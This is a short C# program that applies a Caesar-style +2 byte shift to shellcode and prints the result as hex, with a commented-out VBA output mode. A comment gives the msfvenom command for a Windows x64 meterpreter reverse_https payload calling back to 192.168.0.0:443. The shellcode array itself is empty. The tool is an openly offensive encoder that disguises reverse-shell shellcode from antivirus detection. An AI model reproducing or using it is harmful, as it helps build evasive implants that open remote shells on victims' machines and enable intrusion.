using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 -f csharp
            byte[] buf = new byte[694] {};


            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            uint count = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2); // Increased to 4 for the comma and space
            foreach (byte b in encoded)
            {
                // vba
                // hex.AppendFormat("{0:D}, ", b);
                // count++;
                // if (count % 50 == 0)
                // {
                //     hex.AppendFormat("_{0}", Environment.NewLine);
                // }

                // Caesar Cipher
                hex.AppendFormat("0x{0:x2}, ", b);
                count++;
                
            }

            Console.WriteLine("Length is " + count + " The payload is: " + hex.ToString());
        }
    }
}
